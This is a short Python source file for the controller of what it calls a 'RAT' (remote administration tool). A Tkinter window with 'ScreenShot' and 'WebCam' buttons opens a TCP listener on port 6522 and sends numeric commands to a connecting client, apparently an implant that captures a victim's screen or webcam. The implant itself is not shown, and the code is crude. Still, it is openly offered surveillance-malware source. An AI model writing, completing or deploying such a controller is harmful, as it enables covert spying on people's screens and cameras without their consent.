from socket import *
from tkinter import *

def screen():
	try:
		host = ''
		port = 6522
		addr = (host,port)
		tcp_socket = socket(AF_INET, SOCK_STREAM)
		tcp_socket.bind(addr)
		tcp_socket.listen(90)
		conn, addr = tcp_socket.accept()
		data = conn.recv(1024)
		
		command = '1'
		conn.send(command.encode())
		conn.close()
		tcp_socket.close()
	except:
		pass

def WebCam():
	try:
		host = ''
		port = 6522
		addr = (host,port)
		tcp_socket = socket(AF_INET, SOCK_STREAM)
		tcp_socket.bind(addr)
		tcp_socket.listen(90)
		conn, addr = tcp_socket.accept()
		data = conn.recv(1024)
		command = '2'
		conn.send(command.encode())
		conn.close()
		tcp_socket.close()
	except:
		pass

window = Tk()
window.title("RAT")
window.geometry("250x250")
Label(text="Remote Administration Tools").pack()
btn_screen = Button(text="ScreenShot", command=screen).pack()
btn_webcam = Button(text="WebCam", command=WebCam).pack()

window.mainloop()
